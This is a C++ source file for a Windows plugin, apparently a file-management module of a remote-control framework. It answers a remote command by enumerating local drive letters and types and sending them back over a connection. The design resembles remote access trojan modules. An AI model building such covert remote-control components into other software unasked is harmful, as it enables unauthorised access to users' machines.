#include "pch.h"
#include "PlgFile.h"

PlgFile::PlgFile()
{

}


PlgFile* PlgFile::GetInstance()
{
	static PlgFile* lp = NULL;

	if (lp == NULL)
	{
		lp = new PlgFile;
	}

	return lp;
}

int PlgFile::Load(HMODULE hmodule)
{
	return GetPlgMap()->PlgLoad(hmodule, CMD_PLUGIN_FILE, OnRecv, "file");
}

int __stdcall PlgFile::OnRecv(HANDLE con, PACKET_HEADER* pkt)
{
	switch (pkt->cmd)
	{
	case CMD_PLUGIN_FILE_DISK: return OnEnumDisk(con, pkt); break;
	}
	return -1;
}

int PlgFile::OnEnumDisk(HANDLE con, PACKET_HEADER* pkt)
{
	int error = 0;
	int nDisklen = 0;
	char szDisk[1024] = { 0 };

	for (int i = 0; i < 26; i++) {
	
		char szRoot[16] = { 0 };
		char szDeviceName[256] = { 0 };
		szRoot[0] = 'A' + i;
		szRoot[1] = ':';
		szRoot[2] = 0;
		if (0 == QueryDosDeviceA(szRoot, szDeviceName, 256))
		{
			continue;
		}
		if (0 == lstrcmpiA(szDeviceName, "\\Device\\Floppy"))
		{
			continue;
		}

		szRoot[2] = '\\';
		szRoot[3] = 0;
		UINT drvieType = GetDriveTypeA(szRoot);

		nDisklen += wsprintfA(szDisk + nDisklen, "%c%c", szRoot[0], drvieType);
	}
	pkt->length = nDisklen;
	if (error = GetPlgMap()->PlgSendAll(con, (char*)pkt, sizeof(PACKET_HEADER)))
	{
		return error;
	}

	if (pkt->length)
	{
		if (error = GetPlgMap()->PlgSendAll(con, szDisk, nDisklen))
		{
			return error;
		}
	}

	return error;
}

PLGFUNC* PlgFile::GetPlgMap()
{
	static PLGFUNC* pi = NULL;

	if (pi)
	{
		return pi;
	}

	WCHAR name[32] = { 0 };

	wsprintfW(name, PLUG_MAP_NAME, GetCurrentProcessId());

	HANDLE hmap;

	if (NULL == (hmap = OpenFileMappingW(FILE_MAP_READ, FALSE, name)))
	{
		return NULL;
	}

	if (NULL == (pi = (PLGFUNC*)MapViewOfFile(hmap, FILE_MAP_READ, 0, 0, 0)))
	{
		return NULL;
	}

	CloseHandle(hmap);

	return pi;
}
